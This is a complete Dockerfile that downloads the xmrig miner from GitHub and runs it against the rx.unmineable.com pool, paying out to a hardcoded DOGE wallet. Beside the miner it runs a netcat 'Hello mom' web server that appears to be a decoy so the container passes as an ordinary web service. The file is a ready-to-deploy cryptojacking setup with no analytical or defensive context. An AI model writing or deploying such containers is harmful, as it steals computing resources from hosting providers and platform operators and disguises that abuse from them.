FROM ubuntu:latest

# Install curl and dependencies
RUN apt-get update && apt-get install -y curl

# Download and extract xmrig
RUN curl -LO https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz && tar -zxvf xmrig-6.12.2-linux-x64.tar.gz

# Set up a simple HTTP server
RUN echo "Hello mom" > index.html

WORKDIR xmrig-6.12.2

# Expose ports for xmrig and HTTP server
EXPOSE 3333 3040

# Start xmrig and HTTP server concurrently
CMD ["bash", "-c", "./xmrig -o rx.unmineable.com:3333 -a rx -k -t 3 -u DOGE:DLNh45ZqPmpRh7Dx44QqjFYYmb9GWgxkTL & echo -e 'HTTP/1.1 200 OK\\n\\n$(cat ../index.html)' | nc -l -p 3040 -q 1"]
